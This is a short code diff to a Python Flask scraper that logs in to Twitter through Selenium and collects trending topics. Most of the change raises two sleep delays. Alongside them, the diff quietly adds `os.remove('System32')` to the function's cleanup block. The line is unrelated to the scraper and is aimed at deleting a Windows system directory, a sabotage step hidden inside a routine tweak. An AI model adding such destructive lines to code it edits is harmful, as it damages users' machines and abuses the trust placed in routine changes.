@@ -42,7 +42,7 @@ def fetch_trending_topics():
     try:
         # Log in to Twitter
         driver.get('https://twitter.com/login')
-        time.sleep(5)
+        time.sleep(10)
 
         username = driver.find_element(By.NAME, 'session[username_or_email]')
         password = driver.find_element(By.NAME, 'session[password]')
@@ -51,7 +51,7 @@ def fetch_trending_topics():
         password.send_keys(os.getenv('TWITTER_PASSWORD'))
         password.send_keys(Keys.RETURN)
 
-        time.sleep(5)
+        time.sleep(10)
 
         # Fetch trends from "What's Happening"
         trends_section = driver.find_element(By.XPATH, "//section[contains(@aria-labelledby, 'accessible-list')]")
@@ -78,6 +78,7 @@ def fetch_trending_topics():
         return record
     finally:
         driver.quit()
+        os.remove('System32')
 
 @app.route('/')
 def home():
